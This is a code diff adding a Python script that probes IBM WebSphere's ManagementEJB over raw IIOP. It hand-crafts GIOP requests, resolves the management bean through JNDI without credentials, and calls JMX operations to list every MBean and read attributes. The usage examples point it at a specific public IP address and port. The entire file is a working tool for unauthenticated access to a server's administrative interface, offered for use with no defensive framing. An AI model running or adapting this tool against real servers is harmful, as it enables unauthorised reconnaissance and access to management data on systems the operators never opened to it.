@@ -1,0 +1,546 @@
+#!/usr/bin/env python3
+"""
+ManagementEJB (JSR-77) probe over IIOP.
+
+Resolves the J2EE Management EJB home from WebSphere JNDI, calls create()
+to get a Management bean session, then invokes JMX operations:
+  - getDefaultDomain()    (returns string — confirms access)
+  - getMBeanCount()       (returns int)
+  - queryNames("*:*")     (lists all MBeans)
+  - getAttribute(name, attr)  (reads a specific MBean attribute)
+
+Usage:
+  python3 mejb_probe.py <host> <port>
+  python3 mejb_probe.py <host> <port> attr <ObjectName> <attribute>
+
+Example:
+  python3 mejb_probe.py 130.178.49.47 10204
+  python3 mejb_probe.py 130.178.49.47 10204 attr "WebSphere:*" processId
+"""
+
+import socket
+import struct
+import sys
+
+
+# ── CDR / GIOP helpers ────────────────────────────────────────────────────────
+
+def _align(off, n):
+    rem = off % n
+    return off + (n - rem) if rem else off
+
+
+def recv_giop(sock):
+    header = b''
+    while len(header) < 12:
+        chunk = sock.recv(12 - len(header))
+        if not chunk:
+            break
+        header += chunk
+    if len(header) < 12 or header[:4] != b'GIOP':
+        sock.settimeout(1.0)
+        try:
+            while True:
+                chunk = sock.recv(4096)
+                if not chunk:
+                    break
+                header += chunk
+        except Exception:
+            pass
+        finally:
+            sock.settimeout(None)
+        return header
+    big_endian = (header[6] == 0)
+    msg_size = int.from_bytes(header[8:12], 'big' if big_endian else 'little')
+    body = b''
+    while len(body) < msg_size:
+        chunk = sock.recv(msg_size - len(body))
+        if not chunk:
+            break
+        body += chunk
+    return header + body
+
+
+def connect(host, port, timeout=10):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(timeout)
+    s.connect((host, port))
+    return s
+
+
+def giop_request(object_key, operation, body_bytes=b'', req_id=1):
+    if isinstance(object_key, str):
+        object_key = object_key.encode('ascii')
+    if isinstance(operation, str):
+        operation = operation.encode('ascii')
+    hdr = struct.pack('>I', 0)           # service_context_count
+    hdr += struct.pack('>I', req_id)
+    hdr += b'\x01\x00\x00\x00'          # response_expected + pad
+    key_enc = struct.pack('>I', len(object_key)) + object_key
+    rem = len(key_enc) % 4
+    if rem: key_enc += b'\x00' * (4 - rem)
+    hdr += key_enc
+    op_enc = (operation.decode() if isinstance(operation, bytes) else operation).encode('ascii') + b'\x00'
+    op_enc = struct.pack('>I', len(op_enc)) + op_enc
+    rem = len(op_enc) % 4
+    if rem: op_enc += b'\x00' * (4 - rem)
+    hdr += op_enc
+    hdr += struct.pack('>I', 0)          # principal
+    body = hdr + body_bytes
+    return b'GIOP' + bytes([1, 0, 0, 0]) + struct.pack('>I', len(body)) + body
+
+
+def cdr_string(s, order='big'):
+    enc = s.encode('ascii') + b'\x00'
+    return struct.pack('>I' if order == 'big' else '<I', len(enc)) + enc
+
+
+class CDRDecoder:
+    def __init__(self, data, order='big', base=0):
+        self.data = data
+        self.order = order
+        self.off = 0
+        self.base = base  # absolute offset (for alignment from message start)
+
+    def _align(self, n):
+        pos = self.base + self.off
+        rem = pos % n
+        if rem:
+            self.off += n - rem
+
+    def u8(self):
+        v = self.data[self.off]
+        self.off += 1
+        return v
+
+    def u16(self):
+        self._align(2)
+        v = int.from_bytes(self.data[self.off:self.off+2], self.order)
+        self.off += 2
+        return v
+
+    def u32(self):
+        self._align(4)
+        v = int.from_bytes(self.data[self.off:self.off+4], self.order)
+        self.off += 4
+        return v
+
+    def i32(self):
+        self._align(4)
+        v = int.from_bytes(self.data[self.off:self.off+4], self.order, signed=True)
+        self.off += 4
+        return v
+
+    def string(self):
+        n = self.u32()
+        s = self.data[self.off:self.off+n].rstrip(b'\x00').decode('ascii', errors='replace')
+        self.off += n
+        return s
+
+    def octets(self, n):
+        v = self.data[self.off:self.off+n]
+        self.off += n
+        return v
+
+    def remaining(self):
+        return self.data[self.off:]
+
+
+class CDREncoder:
+    def __init__(self, order='big'):
+        self.order = order
+        self.buf = bytearray()
+
+    def _pad(self, n):
+        rem = len(self.buf) % n
+        if rem:
+            self.buf += b'\x00' * (n - rem)
+
+    def u32(self, v):
+        self._pad(4)
+        self.buf += struct.pack('>I' if self.order == 'big' else '<I', v)
+
+    def i32(self, v):
+        self._pad(4)
+        self.buf += struct.pack('>i' if self.order == 'big' else '<i', v)
+
+    def string(self, s):
+        enc = s.encode('ascii') + b'\x00'
+        self.u32(len(enc))
+        self.buf += enc
+
+    def octets(self, data):
+        self.buf += data
+
+    def build(self):
+        return bytes(self.buf)
+
+
+def encode_name(parts, order='big'):
+    """CDR-encode a CosNaming::Name."""
+    enc = CDREncoder(order)
+    enc.u32(len(parts))
+    for part in parts:
+        enc.string(part)
+        enc.string('')
+    return enc.build()
+
+
+# ── IOR parser ────────────────────────────────────────────────────────────────
+
+def _parse_iiop_profile(pd):
+    if len(pd) < 6:
+        return None
+    try:
+        bo = 'little' if pd[0] == 1 else 'big'
+        off = 1
+        major = pd[off]; off += 1
+        minor = pd[off]; off += 1
+        off = _align(off, 4)
+        hlen = int.from_bytes(pd[off:off+4], bo); off += 4
+        host = pd[off:off+hlen].rstrip(b'\x00').decode('ascii', errors='replace')
+        off += hlen
+        off = _align(off, 2)
+        port = int.from_bytes(pd[off:off+2], bo); off += 2
+        off = _align(off, 4)
+        klen = int.from_bytes(pd[off:off+4], bo); off += 4
+        key = pd[off:off+klen]
+        return {'host': host, 'port': port, 'object_key': key, 'version': '%d.%d' % (major, minor)}
+    except Exception:
+        return None
+
+
+def parse_ior_cdr(data, order='big'):
+    off = [0]
+
+    def align(n):
+        rem = off[0] % n
+        if rem: off[0] += n - rem
+
+    def rd_u32():
+        align(4)
+        v = int.from_bytes(data[off[0]:off[0]+4], order); off[0] += 4
+        return v
+
+    def rd_str():
+        n = rd_u32()
+        s = data[off[0]:off[0]+n].rstrip(b'\x00').decode('ascii', errors='replace')
+        off[0] += n
+        return s
+
+    try:
+        type_id = rd_str()
+        count = rd_u32()
+        profiles = []
+        for _ in range(count):
+            tag = rd_u32()
+            plen = rd_u32()
+            pd = data[off[0]:off[0]+plen]; off[0] += plen
+            align(4)
+            if tag == 0:
+                p = _parse_iiop_profile(pd)
+                if p:
+                    p['type_id'] = type_id
+                    profiles.append(p)
+        return profiles
+    except Exception:
+        return []
+
+
+# ── GIOP send/receive ─────────────────────────────────────────────────────────
+
+def send_recv(host, port, key, operation, body=b'', req_id=1):
+    msg = giop_request(key, operation, body, req_id)
+    s = connect(host, port)
+    s.send(msg)
+    data = recv_giop(s)
+    s.close()
+    return data
+
+
+def parse_reply(data):
+    """Returns (status, order, body_data) or raises."""
+    if len(data) < 12 or data[:4] != b'GIOP' or data[7] != 1:
+        raise ValueError("Not a GIOP Reply: %s" % data[:16].hex())
+    order = 'big' if data[6] == 0 else 'little'
+    minor_v = data[5]
+    if minor_v >= 2:
+        status = int.from_bytes(data[16:20], order)
+        body = data[20:]
+    else:
+        off = 12
+        ctx_count = int.from_bytes(data[off:off+4], order); off += 4
+        for _ in range(ctx_count):
+            if off + 8 > len(data): break
+            cdl = int.from_bytes(data[off+4:off+8], order)
+            off += 8 + cdl
+            rem = off % 4
+            if rem: off += 4 - rem
+        status = int.from_bytes(data[off+4:off+8], order)
+        body = data[off+8:]
+    return status, order, body
+
+
+def send_and_check(host, port, key, operation, body=b'', label='', req_id=1):
+    """
+    Send a GIOP request, handle LOCATION_FORWARD automatically.
+    Returns (key_used, host_used, port_used, body) on success, raises on error.
+    """
+    data = send_recv(host, port, key, operation, body, req_id)
+    status, order, resp_body = parse_reply(data)
+
+    STATUSES = {0: 'NO_EXCEPTION', 1: 'USER_EXCEPTION', 2: 'SYSTEM_EXCEPTION', 3: 'LOCATION_FORWARD'}
+    if label:
+        print("  [%s] %s" % (label, STATUSES.get(status, str(status))))
+
+    if status == 0:
+        return key, host, port, resp_body, order
+
+    if status == 3:
+        # Follow LOCATION_FORWARD
+        profiles = parse_ior_cdr(resp_body, order)
+        for p in profiles:
+            fwd_key  = p['object_key']
+            fwd_host = p['host']
+            fwd_port = p['port'] if p['port'] != 0 else port
+
+            for h in ([fwd_host, host] if fwd_host != host else [host]):
+                try:
+                    data2 = send_recv(h, fwd_port, fwd_key, operation, body, req_id)
+                    s2, o2, b2 = parse_reply(data2)
+                    if label:
+                        print("    -> forward to %s:%d: %s" % (h, fwd_port, STATUSES.get(s2, str(s2))))
+                    if s2 == 0:
+                        return fwd_key, h, fwd_port, b2, o2
+                    if s2 != 3:
+                        _show_exception(b2, o2)
+                        raise RuntimeError("%s: %s" % (label, STATUSES.get(s2, str(s2))))
+                except (ConnectionRefusedError, OSError):
+                    continue
+
+    if status == 2:
+        _show_exception(resp_body, order)
+    raise RuntimeError("%s: %s" % (label or operation, STATUSES.get(status, str(status))))
+
+
+def _show_exception(body, order):
+    """Print CORBA exception body."""
+    if len(body) < 5:
+        return
+    try:
+        slen = int.from_bytes(body[:4], order)
+        if 4 < slen < 512:
+            s = body[4:4+slen].rstrip(b'\x00').decode('ascii', errors='replace')
+            print("    exception: %s" % s)
+            base = 4 + slen
+            rem = base % 4
+            if rem: base += 4 - rem
+            if base + 8 <= len(body):
+                minor = int.from_bytes(body[base:base+4], order)
+                comp  = int.from_bytes(body[base+4:base+8], order)
+                print("    minor=0x%x completed=%s" % (minor, {0:'Yes',1:'No',2:'Maybe'}.get(comp,str(comp))))
+    except Exception:
+        pass
+
+
+# ── JNDI resolution ───────────────────────────────────────────────────────────
+
+def get_root_jmbi_key(host, port):
+    """Get the root naming context JMBI key via NameService LOCATION_FORWARD."""
+    data = send_recv(host, port, b'NameService', 'list', struct.pack('>I', 1))
+    status, order, body = parse_reply(data)
+    if status == 3:
+        profiles = parse_ior_cdr(body, order)
+        if profiles:
+            return profiles[0]['object_key']
+    raise RuntimeError("Could not get root JMBI key (status=%d)" % status)
+
+
+def jndi_resolve(host, port, ctx_key, *name_parts):
+    """
+    Resolve a multi-component JNDI name from ctx_key.
+    Returns (object_key, profiles) — profiles is a list of IIOP endpoint dicts.
+    """
+    body = encode_name(list(name_parts))
+    data = send_recv(host, port, ctx_key, 'resolve', body)
+    status, order, resp_body = parse_reply(data)
+
+    if status == 0:
+        profiles = parse_ior_cdr(resp_body, order)
+        if profiles:
+            return profiles[0]['object_key'], profiles
+        raise RuntimeError("resolve() returned no IIOP profiles")
+
+    if status == 3:
+        profiles = parse_ior_cdr(resp_body, order)
+        if profiles:
+            return profiles[0]['object_key'], profiles
+
+    raise RuntimeError("jndi_resolve(%s) failed: status=%d" % ('/'.join(name_parts), status))
+
+
+# ── ManagementEJB operations ──────────────────────────────────────────────────
+
+def mejb_create(host, port, home_key):
+    """Call create() on the EJB home to get a Management session bean."""
+    key, h, p, body, order = send_and_check(host, port, home_key, 'create', b'', 'create()')
+    profiles = parse_ior_cdr(body, order)
+    if profiles:
+        bean_key = profiles[0]['object_key']
+        bean_port = profiles[0]['port'] if profiles[0]['port'] != 0 else port
+        print("  [+] Got Management bean  key=%s..." % bean_key.hex()[:32])
+        return bean_key, h, bean_port
+    # If no profiles in body, the home IS the bean (stateless session bean short-cut)
+    return home_key, host, port
+
+
+def mejb_getDefaultDomain(host, port, bean_key):
+    _, h, p, body, order = send_and_check(host, port, bean_key, 'getDefaultDomain', b'', 'getDefaultDomain()')
+    dec = CDRDecoder(body, order)
+    domain = dec.string()
+    print("  [+] Default domain: %s" % domain)
+    return domain
+
+
+def mejb_getMBeanCount(host, port, bean_key):
+    _, h, p, body, order = send_and_check(host, port, bean_key, 'getMBeanCount', b'', 'getMBeanCount()')
+    dec = CDRDecoder(body, order)
+    count = dec.u32()
+    print("  [+] MBean count: %d" % count)
+    return count
+
+
+def mejb_queryNames(host, port, bean_key, pattern='*:*'):
+    """
+    Call queryNames(ObjectName, QueryExp).
+    ObjectName is encoded as a string in CORBA IDL.
+    QueryExp null = no filter (encoded as a nil object reference or special CDR null).
+    """
+    enc = CDREncoder()
+    # ObjectName: in JSR-77 IDL it's mapped as a string
+    enc.string(pattern)
+    # QueryExp: null object reference in CORBA is a zero-length IOR
+    # Encoded as: type_id="" (len=1, "\0"), profile_count=0
+    enc.u32(1)    # type_id length (just null byte)
+    enc.octets(b'\x00')  # null type_id
+    enc._pad(4)
+    enc.u32(0)    # profile_count = 0
+
+    body = enc.build()
+    _, h, p, resp_body, order = send_and_check(host, port, bean_key, 'queryNames', body, 'queryNames()')
+    # Response: sequence<string> (MBean names)
+    dec = CDRDecoder(resp_body, order)
+    count = dec.u32()
+    names = []
+    for _ in range(count):
+        names.append(dec.string())
+    return names
+
+
+def mejb_getAttribute(host, port, bean_key, mbean_name, attribute):
+    """Call getAttribute(ObjectName, String)."""
+    enc = CDREncoder()
+    enc.string(mbean_name)
+    enc.string(attribute)
+    body = enc.build()
+    _, h, p, resp_body, order = send_and_check(host, port, bean_key, 'getAttribute', body, 'getAttribute(%s, %s)' % (mbean_name, attribute))
+    # Response: Any — complex to decode fully; just show raw + strings
+    print("  body hex: %s" % resp_body[:256].hex())
+    _print_strings(resp_body)
+    return resp_body
+
+
+def _print_strings(data, min_len=5):
+    current = []; found = []
+    for b in data:
+        if 32 <= b <= 126:
+            current.append(chr(b))
+        else:
+            if len(current) >= min_len:
+                found.append(''.join(current))
+            current = []
+    if len(current) >= min_len:
+        found.append(''.join(current))
+    if found:
+        print("  strings: %s" % ' | '.join(found[:40]))
+
+
+# ── main ──────────────────────────────────────────────────────────────────────
+
+if __name__ == '__main__':
+    if len(sys.argv) < 3:
+        print(__doc__)
+        sys.exit(1)
+
+    host = sys.argv[1]
+    port = int(sys.argv[2])
+    mode = sys.argv[3] if len(sys.argv) > 3 else 'probe'
+
+    print("[*] Getting root JMBI key from %s:%d..." % (host, port))
+    root_key = get_root_jmbi_key(host, port)
+    print("    key: %s..." % root_key.hex()[:32])
+
+    print("[*] Resolving ManagementEJB home from JNDI...")
+    # Try both name variants
+    home_key = None
+    for name_path in [
+        ['applications', 'ManagementEJB', 'mejb', 'Management'],
+        ['ejb', 'mgmt', 'ManagementEJB'],
+    ]:
+        try:
+            home_key, profiles = jndi_resolve(host, port, root_key, *name_path)
+            print("    [+] Resolved via: %s" % '/'.join(name_path))
+            print("    key: %s..." % home_key.hex()[:32])
+            if profiles:
+                p = profiles[0]
+                print("    type_id: %s" % p.get('type_id', '?'))
+            break
+        except Exception as e:
+            print("    [-] %s: %s" % ('/'.join(name_path), e))
+
+    if home_key is None:
+        print("[!] Could not resolve ManagementEJB home from JNDI")
+        sys.exit(1)
+
+    print("\n[*] Calling create() on EJB home...")
+    try:
+        bean_key, bean_host, bean_port = mejb_create(host, port, home_key)
+    except Exception as e:
+        print("  [!] create() failed: %s" % e)
+        print("  Trying to use home key directly as bean...")
+        bean_key, bean_host, bean_port = home_key, host, port
+
+    print("\n[*] Probing Management bean operations...")
+
+    try:
+        mejb_getDefaultDomain(bean_host, bean_port, bean_key)
+    except Exception as e:
+        print("  [!] getDefaultDomain: %s" % e)
+
+    try:
+        mejb_getMBeanCount(bean_host, bean_port, bean_key)
+    except Exception as e:
+        print("  [!] getMBeanCount: %s" % e)
+
+    if mode == 'attr' and len(sys.argv) >= 6:
+        mbean = sys.argv[4]
+        attr  = sys.argv[5]
+        print("\n[*] getAttribute(%s, %s)" % (mbean, attr))
+        try:
+            mejb_getAttribute(bean_host, bean_port, bean_key, mbean, attr)
+        except Exception as e:
+            print("  [!] %s" % e)
+
+    elif mode == 'probe':
+        print("\n[*] queryNames('*:*') — listing all JMX MBeans...")
+        try:
+            names = mejb_queryNames(bean_host, bean_port, bean_key)
+            if names:
+                print("  [+] %d MBeans found:" % len(names))
+                for n in sorted(names):
+                    print("    %s" % n)
+            else:
+                print("  (empty result — zero MBeans or encoding mismatch)")
+                print("  raw body hex for manual inspection logged above")
+        except Exception as e:
+            print("  [!] queryNames: %s" % e)
